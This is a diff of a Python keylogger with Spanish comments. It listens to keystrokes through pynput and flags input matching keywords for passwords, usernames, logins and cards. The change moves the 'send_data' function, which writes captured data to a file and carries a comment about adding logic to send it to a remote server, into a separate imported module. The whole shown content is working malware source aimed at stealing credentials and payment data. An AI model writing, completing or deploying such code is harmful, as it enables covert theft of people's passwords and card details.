@@ -1,10 +1,9 @@
 import re
 import threading
-
 from pynput import keyboard as pynput_keyboard
 import keyboard as py_keyboard
 import Global
-
+from send_data import send_data
 # Lista de palabras clave que el programa buscará en las pulsaciones de teclas
 keywords = ["contraseña", "password", "usuario", "login", "tarjeta"]
 # Lista para almacenar las teclas presionadas hasta el momento
@@ -40,15 +39,6 @@ def get_click(tecla):
 
     else:
         print("Sin data sensible")
-
-
-# Función para enviar datos al servidor remoto
-def send_data(data):
-    # Abre el archivo "keylogger.txt" en modo de escritura al final del archivo
-    with open("keylogger.txt", "w") as f:
-        # Escribe los datos en el archivo
-        f.write(data)
-    # Aquí deberías agregar la lógica necesaria para enviar estos datos a un servidor remoto
 
 
 # Inicia el keylogger utilizando pynput.keyboard.Listener
